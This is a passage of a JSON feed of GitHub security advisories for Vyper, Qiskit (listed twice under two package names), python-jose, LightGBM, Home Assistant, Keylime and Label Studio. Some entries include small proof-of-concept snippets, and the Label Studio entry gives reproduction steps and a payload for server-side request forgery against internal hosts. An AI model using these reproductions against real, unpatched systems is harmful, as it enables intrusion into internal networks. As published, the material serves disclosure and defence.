            "content_html": "<p>Vyper handles AugAssign statements by first caching the target location to avoid double evaluation. However, in the case when target is an access to a DynArray and the rhs modifies the array, the cached target will evaluate first, and the bounds check will not be re-evaluated during the write portion of the statement. In other words, the following code</p>\n<pre><code class=\"language-vyper\">def poc():\n    a: DynArray[uint256, 2] = [1, 2]\n    a[1] += a.pop()\n</code></pre>\n<p>is equivalent to:</p>\n<pre><code class=\"language-vyper\">def poc():\n    a: DynArray[uint256, 2] = [1, 2]\n    a[1] += a[len(a) - 1]\n    a.pop()\n</code></pre>\n<p>rather than:</p>\n<pre><code class=\"language-vyper\">def poc():\n    a: DynArray[uint256, 2] = [1, 2]\n    s: uint256 = a[1]\n    t: uint256 = a.pop()\n    a[1] = s + t  # reverts due to oob access\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-4w26-8p97-f4jp\">https://github.com/vyperlang/vyper/security/advisories/GHSA-4w26-8p97-f4jp</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-27105\">https://nvd.nist.gov/vuln/detail/CVE-2025-27105</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-4w26-8p97-f4jp\">https://github.com/advisories/GHSA-4w26-8p97-f4jp</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-4w26-8p97-f4jp",
            "title": "[vyper] AugAssign evaluation order causing OOB write within the object in Vyper",
            "date_modified": "2025-02-24T20:25:11.000Z",
            "date_published": "2025-02-21T22:43:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-4w26-8p97-f4jp"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Vyper's <code>sqrt()</code> builtin uses the babylonian method to calculate square roots of decimals. Unfortunately, improper handling of the oscillating final states may lead to sqrt incorrectly returning rounded up results.</p>\n<p>the fix is tracked in <a href=\"https://github.com/vyperlang/vyper/pull/4486\">https://github.com/vyperlang/vyper/pull/4486</a></p>\n<h3 id=\"vulnerability-details\">Vulnerability Details</h3>\n<p>Vyper injects the following code to handle calculation of decimal sqrt. x is the input provided by user.</p>\n<pre><code class=\"language-python\">assert x &gt;= 0.0\nz: decimal = 0.0\n\nif x == 0.0:\n    z = 0.0\nelse:\n    z = x / 2.0 + 0.5\n    y: decimal = x\n\n    for i: uint256 in range(256):\n        if z == y:\n            break\n        y = z\n        z = (x / z + z) / 2.0\n</code></pre>\n<p>Notably, the terminal condition of the algorithm is either <code>z_cur == z_prev</code>, or the algorithm runs for 256 rounds.</p>\n<p>However, for certain inputs, <code>z</code> might actually oscillate between <code>N</code> and <code>N + epsilon</code>, where <code>N ** 2 &lt;= x &lt; (N + epsilon) ** 2</code>. This means that the current behavior does not define whether it will round up or down to the nearest epsilon.</p>\n<p>The example snippet here returns 0.9999999999, the rounded up result for sqrt(0.9999999998). This is due to the oscillation ending in N + epsilon instead of N.</p>\n<pre><code class=\"language-vyper\">@external\ndef test():\n    d: decimal = 0.9999999998\n    r: decimal = sqrt(d)    #this will be 0.9999999999\n</code></pre>\n<p>Note that <code>sqrt()</code> diverges from <code>isqrt()</code> here -- <code>isqrt()</code> consistently rounds down, so it is not subject to the same issue.</p>\n<h3 id=\"impact-details\">Impact Details</h3>\n<p>Since <code>sqrt()</code> can be used for determining boundary conditions, rounding down is preferred. However, since <code>sqrt()</code> is used very rarely in the wild, this advisory has been assigned an impact of <code>low</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-2p94-8669-xg86\">https://github.com/vyperlang/vyper/security/advisories/GHSA-2p94-8669-xg86</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/pull/4486\">https://github.com/vyperlang/vyper/pull/4486</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-26622\">https://nvd.nist.gov/vuln/detail/CVE-2025-26622</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2p94-8669-xg86\">https://github.com/advisories/GHSA-2p94-8669-xg86</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2p94-8669-xg86",
            "title": "[vyper] Vyper's sqrt doesn't define rounding behavior",
            "date_modified": "2025-02-24T20:23:52.000Z",
            "date_published": "2025-02-21T22:43:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2p94-8669-xg86"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A maliciously crafted QPY file containing a malformed <code>symengine</code> serialization stream as part of the larger QPY serialization of a <code>ParameterExpression</code> object can cause a segfault within the <code>symengine</code> library, allowing an attacker to terminate the hosting process deserializing the QPY payload.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is addressed in 1.3.0 when using QPY format version 13. QPY format versions 10, 11, and 12 are all still inherently vulnerable if they are using symengine symbolic encoding and <code>symengine &lt;= 0.13.0</code> is installed in the deserializing environment (as of publishing there is no newer compatible release of symengine available). Using QPY 13 is strongly recommended for this reason.</p>\n<p>The symengine 0.14.0 release has addressed the segfault issue, but it is backward incompatible and will not work with any Qiskit release; it also prevents loading a payload generated with any other version of symengine. Using QPY 13 is strongly recommended for this reason.</p>\n<p>It is also strongly suggested to patch the locally installed version of symengine in the deserializing environment to prevent the specific segfault. The commit [1] can be applied on top of symengine 0.13.0 and used to build a patched python library that will not segfault in the presence of a malformed payload and instead raise a <code>RuntimeError</code> which will address the vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>As QPY is backwards compatible <code>qiskit.qpy.load()</code> function will always attempt to deserialize the <code>symengine</code>-serialized payloads in QPY format versions 10, 11, and 12. These are any payloads generated with the <code>use_symengine</code> argument on <code>qiskit.qpy.dump()</code> set to <code>True</code> (which is the default value starting in Qiskit 1.0.0. The only option is to disallow parsing if those QPY formats are being read and the <code>use_symengine</code> flag was set in the file's header. You can detect whether a payload is potentially vulnerable by using the following function built using the Python standard library:</p>\n<pre><code class=\"language-python\">import struct\nfrom collections import namedtuple\n\n\ndef check_qpy_payload(path: str) -&gt; bool:\n    \"\"\"Function to check if a QPY payload is potentially vulnerable to a symengine vulnerability.\n\n    Args:\n        path: The path to the QPY file\n\n    Returns:\n        Whether the specified payload is potentially vulnerable. If ``True`` the conditions for\n        being vulnerable exist, however the payload may not be vulnerable it can't be detected\n        until trying to deserialize.\n    \"\"\"\n    with open(path, \"rb\") as file_obj:\n        version = struct.unpack(\"!6sB\", file_obj.read(7))[1]\n        if version &lt; 10 or version &gt;= 13:\n            return False\n        file_obj.seek(0)\n        header_tuple = namedtuple(\n            \"FILE_HEADER\",\n            [\n                \"preface\",\n                \"qpy_version\",\n                \"major_version\",\n                \"minor_version\",\n                \"patch_version\",\n                \"num_programs\",\n                \"symbolic_encoding\",\n            ],\n        )\n        header_pack_str = \"!6sBBBBQc\"\n        header_read_size = struct.calcsize(header_pack_str)\n        data = struct.unpack(header_pack_str, file_obj.read(header_read_size))\n        header = header_tuple(*data)\n        return header.symbolic_encoding == b\"e\"\n</code></pre>\n<p>Note, this function does <strong>not</strong> tell you whether the payload is malicious and will cause the segfault, just that conditions for it to be potentially malicious exist. It's not possible to know ahead of time whether <code>symengine</code> will segfault until the data is passed to that library.</p>\n<h3 id=\"references\">References</h3>\n<p>[1] <a href=\"https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51\">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x\">https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1403\">https://nvd.nist.gov/vuln/detail/CVE-2025-1403</a></li>\n<li><a href=\"https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51\">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></li>\n<li><a href=\"https://www.ibm.com/support/pages/node/7183868\">https://www.ibm.com/support/pages/node/7183868</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fpmr-m242-xm7x\">https://github.com/advisories/GHSA-fpmr-m242-xm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fpmr-m242-xm7x",
            "title": "[qiskit-terra] Malciously crafted QPY files can allows Remote Attackers to Cause Denial of Service in Qiskit",
            "date_modified": "2025-02-21T21:42:45.000Z",
            "date_published": "2025-02-21T21:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fpmr-m242-xm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A maliciously crafted QPY file containing a malformed <code>symengine</code> serialization stream as part of the larger QPY serialization of a <code>ParameterExpression</code> object can cause a segfault within the <code>symengine</code> library, allowing an attacker to terminate the hosting process deserializing the QPY payload.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This issue is addressed in 1.3.0 when using QPY format version 13. QPY format versions 10, 11, and 12 are all still inherently vulnerable if they are using symengine symbolic encoding and <code>symengine &lt;= 0.13.0</code> is installed in the deserializing environment (as of publishing there is no newer compatible release of symengine available). Using QPY 13 is strongly recommended for this reason.</p>\n<p>The symengine 0.14.0 release has addressed the segfault issue, but it is backward incompatible and will not work with any Qiskit release; it also prevents loading a payload generated with any other version of symengine. Using QPY 13 is strongly recommended for this reason.</p>\n<p>It is also strongly suggested to patch the locally installed version of symengine in the deserializing environment to prevent the specific segfault. The commit [1] can be applied on top of symengine 0.13.0 and used to build a patched python library that will not segfault in the presence of a malformed payload and instead raise a <code>RuntimeError</code> which will address the vulnerability.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>As QPY is backwards compatible <code>qiskit.qpy.load()</code> function will always attempt to deserialize the <code>symengine</code>-serialized payloads in QPY format versions 10, 11, and 12. These are any payloads generated with the <code>use_symengine</code> argument on <code>qiskit.qpy.dump()</code> set to <code>True</code> (which is the default value starting in Qiskit 1.0.0. The only option is to disallow parsing if those QPY formats are being read and the <code>use_symengine</code> flag was set in the file's header. You can detect whether a payload is potentially vulnerable by using the following function built using the Python standard library:</p>\n<pre><code class=\"language-python\">import struct\nfrom collections import namedtuple\n\n\ndef check_qpy_payload(path: str) -&gt; bool:\n    \"\"\"Function to check if a QPY payload is potentially vulnerable to a symengine vulnerability.\n\n    Args:\n        path: The path to the QPY file\n\n    Returns:\n        Whether the specified payload is potentially vulnerable. If ``True`` the conditions for\n        being vulnerable exist, however the payload may not be vulnerable it can't be detected\n        until trying to deserialize.\n    \"\"\"\n    with open(path, \"rb\") as file_obj:\n        version = struct.unpack(\"!6sB\", file_obj.read(7))[1]\n        if version &lt; 10 or version &gt;= 13:\n            return False\n        file_obj.seek(0)\n        header_tuple = namedtuple(\n            \"FILE_HEADER\",\n            [\n                \"preface\",\n                \"qpy_version\",\n                \"major_version\",\n                \"minor_version\",\n                \"patch_version\",\n                \"num_programs\",\n                \"symbolic_encoding\",\n            ],\n        )\n        header_pack_str = \"!6sBBBBQc\"\n        header_read_size = struct.calcsize(header_pack_str)\n        data = struct.unpack(header_pack_str, file_obj.read(header_read_size))\n        header = header_tuple(*data)\n        return header.symbolic_encoding == b\"e\"\n</code></pre>\n<p>Note, this function does <strong>not</strong> tell you whether the payload is malicious and will cause the segfault, just that conditions for it to be potentially malicious exist. It's not possible to know ahead of time whether <code>symengine</code> will segfault until the data is passed to that library.</p>\n<h3 id=\"references\">References</h3>\n<p>[1] <a href=\"https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51\">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x\">https://github.com/Qiskit/qiskit/security/advisories/GHSA-fpmr-m242-xm7x</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-1403\">https://nvd.nist.gov/vuln/detail/CVE-2025-1403</a></li>\n<li><a href=\"https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51\">https://github.com/symengine/symengine/commit/eb3e292bf13b2dfdf0fa1c132944af8df2bc7d51</a></li>\n<li><a href=\"https://www.ibm.com/support/pages/node/7183868\">https://www.ibm.com/support/pages/node/7183868</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fpmr-m242-xm7x\">https://github.com/advisories/GHSA-fpmr-m242-xm7x</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fpmr-m242-xm7x",
            "title": "[qiskit] Malciously crafted QPY files can allows Remote Attackers to Cause Denial of Service in Qiskit",
            "date_modified": "2025-02-21T21:42:45.000Z",
            "date_published": "2025-02-21T21:42:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fpmr-m242-xm7x"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>python-jose through 3.3.0 has algorithm confusion with OpenSSH ECDSA keys and other key formats. This is similar to CVE-2022-29217.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-33663\">https://nvd.nist.gov/vuln/detail/CVE-2024-33663</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/issues/346\">https://github.com/mpdavis/python-jose/issues/346</a></li>\n<li><a href=\"https://www.vicarius.io/vsociety/posts/algorithm-confusion-in-python-jose-cve-2024-33663\">https://www.vicarius.io/vsociety/posts/algorithm-confusion-in-python-jose-cve-2024-33663</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-232.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-232.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6c5p-j8vq-pqhj\">https://github.com/advisories/GHSA-6c5p-j8vq-pqhj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6c5p-j8vq-pqhj",
            "title": "[python-jose] python-jose algorithm confusion with OpenSSH ECDSA keys",
            "date_modified": "2025-02-18T22:48:16.000Z",
            "date_published": "2024-04-26T00:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6c5p-j8vq-pqhj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>python-jose through 3.3.0 allows attackers to cause a denial of service (resource consumption) during a decode via a crafted JSON Web Encryption (JWE) token with a high compression ratio, aka a \"JWT bomb.\" This is similar to CVE-2024-21319.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-33664\">https://nvd.nist.gov/vuln/detail/CVE-2024-33664</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/issues/344\">https://github.com/mpdavis/python-jose/issues/344</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/pull/345\">https://github.com/mpdavis/python-jose/pull/345</a></li>\n<li><a href=\"https://www.vicarius.io/vsociety/posts/jwt-bomb-in-python-jose-cve-2024-33664\">https://www.vicarius.io/vsociety/posts/jwt-bomb-in-python-jose-cve-2024-33664</a></li>\n<li><a href=\"https://github.com/mpdavis/python-jose/releases/tag/3.4.0\">https://github.com/mpdavis/python-jose/releases/tag/3.4.0</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-233.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/python-jose/PYSEC-2024-233.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cjwg-qfpm-7377\">https://github.com/advisories/GHSA-cjwg-qfpm-7377</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cjwg-qfpm-7377",
            "title": "[python-jose] python-jose denial of service via compressed JWE content",
            "date_modified": "2025-02-18T22:46:49.000Z",
            "date_published": "2024-04-26T00:30:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cjwg-qfpm-7377"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>LightGBM Remote Code Execution Vulnerability</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-43598\">https://nvd.nist.gov/vuln/detail/CVE-2024-43598</a></li>\n<li><a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43598\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43598</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/lightgbm/PYSEC-2024-231.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/lightgbm/PYSEC-2024-231.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-2586-f3p4-hq84\">https://github.com/advisories/GHSA-2586-f3p4-hq84</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-2586-f3p4-hq84",
            "title": "[lightgbm] LightGBM Remote Code Execution Vulnerability",
            "date_modified": "2025-02-18T19:25:53.000Z",
            "date_published": "2024-11-12T18:30:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-2586-f3p4-hq84"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>Problem: Potential man-in-the-middle attacks due to missing SSL certificate verification in the project codebase and used third-party libraries.</p>\n<h2 id=\"details\">Details</h2>\n<p>In the past, <code>aiohttp-session</code>/<code>request</code> had the parameter <code>verify_ssl</code> to control SSL certificate verification. This was a boolean value. In <code>aiohttp</code> 3.0, this parameter was deprecated in favor of the <code>ssl</code> parameter. Only when <code>ssl</code> is set to <code>None</code> or provided with a correct configured SSL context the standard SSL certificate verification will happen.</p>\n<p>When migrating integrations in Home Assistant and libraries used by Home Assistant, in some cases the <code>verify_ssl</code> parameter value was just moved to the new <code>ssl</code> parameter. This resulted in these integrations and 3rd party libraries using <code>request.ssl = True</code>, which unintentionally turned off SSL certificate verification and opened up a man-in-the-middle attack vector.</p>\n<p>Example:\n<a href=\"https://github.com/home-assistant/core/blob/c4411914c2e906105b765c00af5740bd0880e946/homeassistant/components/discord/notify.py#L84\">https://github.com/home-assistant/core/blob/c4411914c2e906105b765c00af5740bd0880e946/homeassistant/components/discord/notify.py#L84</a></p>\n<p>When you scan the libraries used by the integrations in Home Assistant, you will find more issues like this.</p>\n<p>The general handling in Home Assistant looks good, as <code>homeassistant.helpers.aoihttp_client._async_get_connector</code> handles it correctly.</p>\n<h2 id=\"poc\">PoC</h2>\n<ol>\n<li>Check that expired.badssl.com:443 gives an SSL error in when connecting with curl or browser.</li>\n<li>Add the integration adguard with the setting <code>host=expired.badssl.com</code>, <code>port=443</code>, <code>use-ssl=true</code>, <code>verify-ssl=true</code>.</li>\n<li>Check the logs - you get a HTTP 403 response.</li>\n</ol>\n<p>Expected behavior:</p>\n<ol>\n<li>The integration log shows an <code>ssl.SSLCertVerificationError</code>.</li>\n</ol>\n<p>The following code shows the problem with <code>ssl=True</code>. No exception is raised when <code>ssl=True</code> (Python 3.11.6).</p>\n<pre><code>import asyncio\nfrom ssl import SSLCertVerificationError\n\nimport aiohttp\n\nBAD_URL = \"https://expired.badssl.com/\"\n\n\nasync def run_request(verify_ssl, result_placeholder: str):\n    async with aiohttp.ClientSession() as session:\n        exception_fired: bool = False\n        try:\n            await session.request(\"OPTIONS\", BAD_URL, ssl=verify_ssl)\n        except SSLCertVerificationError:\n            exception_fired = True\n        except Exception as error:\n            print(error)\n        else:\n            exception_fired = False\n        print(result_placeholder.format(exception_result=exception_fired))\n\n\n# Case 1: ssl=False --&gt; expected result: No exception\nasyncio.run(run_request(False, \"Test case 1: expected result: False - result: {exception_result}\"))\n\n# Case 2: ssl=None --&gt; expected result: Exception\nasyncio.run(run_request(None, \"Test case 2: expected result: True - result: {exception_result}\"))\n\n# Case 3: ssl=True --&gt; expected result: No Exception\nasyncio.run(run_request(True, \"Test case 3: expected result: False - result: {exception_result}\"))\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/home-assistant/core/security/advisories/GHSA-m3pm-rpgg-5wj6\">https://github.com/home-assistant/core/security/advisories/GHSA-m3pm-rpgg-5wj6</a></li>\n<li><a href=\"https://github.com/home-assistant/core/commit/8c6547f1b64f4a3d9f10090b97383353c9367892\">https://github.com/home-assistant/core/commit/8c6547f1b64f4a3d9f10090b97383353c9367892</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25305\">https://nvd.nist.gov/vuln/detail/CVE-2025-25305</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m3pm-rpgg-5wj6\">https://github.com/advisories/GHSA-m3pm-rpgg-5wj6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m3pm-rpgg-5wj6",
            "title": "[homeassistant] Home Assistant does not correctly validate SSL for outgoing requests in core and used libs",
            "date_modified": "2025-02-18T22:51:43.000Z",
            "date_published": "2025-02-18T19:25:24.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m3pm-rpgg-5wj6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Keylime <code>registrar</code> implemented more strict type checking on version 7.12.0. As a result, when updated to version 7.12.0, the <code>registrar</code> will not accept the format of the data previously stored in the database by versions  &gt;= 7.8.0, raising an exception.</p>\n<p>This makes the Keylime <code>registrar</code> vulnerable to a Denial-of-Service attack in an update scenario, as an attacker could populate the <code>registrar</code> database by creating multiple valid agent registrations with different UUIDs while the version is still &lt; 7.12.0. Then, when the Keylime <code>registrar</code> is updated to the 7.12.0 version, any query to the database matching any of the entries populated by the attacker will result in failure.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Users should upgrade to versions &gt;= 7.12.1</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Remove the registrar database and re-register all agents</li>\n</ul>\n<h3 id=\"credit\">Credit</h3>\n<p>Reported by: Anderson Toshiyuki Sasaki/@ansasaki\nPatched by: Anderson Toshiyuki Sasaki/@ansasaki</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/keylime/keylime/security/advisories/GHSA-9jxq-5x44-gx23\">https://github.com/keylime/keylime/security/advisories/GHSA-9jxq-5x44-gx23</a></li>\n<li><a href=\"https://github.com/keylime/keylime/commit/e08b10d86c3717006774e787542c190e2ba24fc7\">https://github.com/keylime/keylime/commit/e08b10d86c3717006774e787542c190e2ba24fc7</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9jxq-5x44-gx23\">https://github.com/advisories/GHSA-9jxq-5x44-gx23</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9jxq-5x44-gx23",
            "title": "[keylime] Keylime registrar is vulnerable to Denial-of-Service attack when updated to version 7.12.0",
            "date_modified": "2025-02-14T18:03:15.000Z",
            "date_published": "2025-02-14T18:03:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9jxq-5x44-gx23"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"description\">Description</h2>\n<p>Label Studio's S3 storage integration feature contains a Server-Side Request Forgery (SSRF) vulnerability in its endpoint configuration. When creating an S3 storage connection, the application allows users to specify a custom S3 endpoint URL via the s3_endpoint parameter. This endpoint URL is passed directly to the boto3 AWS SDK without proper validation or restrictions on the protocol or destination.</p>\n<p>The vulnerability allows an attacker to make the application send HTTP requests to arbitrary internal services by specifying them as the S3 endpoint. When the storage sync operation is triggered, the application attempts to make S3 API calls to the specified endpoint, effectively making HTTP requests to the target service and returning the response in error messages.</p>\n<p>This SSRF vulnerability enables attackers to bypass network segmentation and access internal services that should not be accessible from the external network. The vulnerability is particularly severe because error messages from failed requests contain the full response body, allowing data exfiltration from internal services.</p>\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n<ol>\n<li><p>Create an account in Label Studio</p>\n</li>\n<li><p>Create a new project with basic configuration</p>\n</li>\n<li><p>Create an S3 storage connection with the following configuration:</p>\n<pre><code class=\"language-json\">{\n  \"project\": 1,\n  \"title\": \"Test Storage\",\n  \"bucket\": \"&lt;filename&gt;\",\n  \"s3_endpoint\": \"http://internal-web\",\n  \"use_blob_urls\": true,\n  \"aws_access_key_id\": \"test\",\n  \"aws_secret_access_key\": \"test\"\n}\n</code></pre>\n</li>\n<li><p>Trigger a storage sync operation by sending a POST request to <code>/api/storages/s3/[storage_id]/sync</code></p>\n</li>\n</ol>\n<p>The application will attempt to connect to the specified endpoint URL as if it were an S3 service. When the request fails due to invalid S3 API responses, the error message will contain the raw response from the internal service, allowing access to internal resources.</p>\n<h2 id=\"mitigations\">Mitigations</h2>\n<ul>\n<li>Implement strict validation of S3 endpoint URLs to allow only valid S3service endpoints</li>\n<li>Add an allowlist of endpoint domains and protocols</li>\n<li>Sanitize error messages to prevent leakage of sensitive information from failed requests</li>\n<li>Consider implementing network-level controls to restrict outbound connections from the application server</li>\n</ul>\n<h2 id=\"impact\">Impact</h2>\n<p>This vulnerability has high severity as it allows authenticated users to make requests to arbitrary internal services from the application server, potentially exposing sensitive internal resources and bypassing network segmentation. The inclusion of response data in error messages makes this particularly effective for data exfiltration.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-m238-fmcw-wh58\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-m238-fmcw-wh58</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/06a2b29c1208e1878ccae66e6b84c8b24598fa79\">https://github.com/HumanSignal/label-studio/commit/06a2b29c1208e1878ccae66e6b84c8b24598fa79</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-25297\">https://nvd.nist.gov/vuln/detail/CVE-2025-25297</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m238-fmcw-wh58\">https://github.com/advisories/GHSA-m238-fmcw-wh58</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m238-fmcw-wh58",
            "title": "[label-studio] Label Studio allows Server-Side Request Forgery in the S3 Storage Endpoint",
            "date_modified": "2025-02-14T22:18:11.000Z",
            "date_published": "2025-02-14T15:26:56.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m238-fmcw-wh58"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}